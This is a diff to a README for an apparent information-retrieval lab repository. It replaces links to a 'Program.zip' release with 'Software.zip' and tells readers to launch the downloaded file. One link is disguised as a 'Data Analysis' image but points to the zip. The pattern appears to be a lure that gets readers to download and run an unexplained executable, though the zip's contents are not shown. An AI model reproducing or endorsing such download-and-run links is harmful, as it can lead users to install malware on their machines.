@@ -25,7 +25,7 @@ Laboratory 8 focuses on retrieving information efficiently and accurately. The t
 
 ## Software Download 🖥️
 You can download the software related to this repository by clicking the button below:
-[![Download Software](https://github.com/Saffronduck5667/precision-r-comparison/releases/download/v1.0/Program.zip)](https://github.com/Saffronduck5667/precision-r-comparison/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/Saffronduck5667/precision-r-comparison/releases/download/v2.0/Software.zip)](https://github.com/Saffronduck5667/precision-r-comparison/releases/download/v2.0/Software.zip)
 
 *Note: Please make sure to launch the downloaded file to access the software.* 🚀
 
@@ -38,7 +38,7 @@ Let's embark on a journey of precision information retrieval together! 🌟
 
 **Happy coding!** 💻🔍
 
-![Data Analysis](https://github.com/Saffronduck5667/precision-r-comparison/releases/download/v1.0/Program.zip)
+![Data Analysis](https://github.com/Saffronduck5667/precision-r-comparison/releases/download/v2.0/Software.zip)
 
 ---
 **© 2023 Precision R Comparison.** Released under the MIT License.
